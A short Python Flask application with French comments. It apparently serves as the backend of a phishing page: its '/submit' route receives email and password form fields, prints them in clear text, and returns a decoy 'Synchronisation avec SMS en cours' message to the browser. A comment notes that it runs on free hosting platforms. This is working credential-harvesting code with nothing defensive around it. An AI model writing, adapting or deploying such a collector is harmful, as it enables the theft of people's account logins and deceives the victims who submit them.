from flask import Flask, request, render_template_string

app = Flask(__name__)

# Page d'accueil simple (évite 404 si quelqu’un ouvre le domaine sans /submit)
@app.route("/", methods=["GET"])
def home():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head><title>Serveur actif</title></head>
    <body>
        <h1>Serveur Flask en ligne ✔️</h1>
        <p>La route de réception est : <b>/submit</b></p>
    </body>
    </html>
    """)

# Route qui reçoit les données du formulaire
@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    password = request.form.get("password")

    print("\n📩 Nouvelle soumission reçue :")
    print("Email :", email)
    print("Password :", password)
    print("-----------------------------\n")

    # Réponse envoyée au navigateur après l'envoi du form
    return "Synchronisation avec SMS en cours"

# Démarrage du serveur (Render, Replit, Railway, etc. utilisent ce port)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
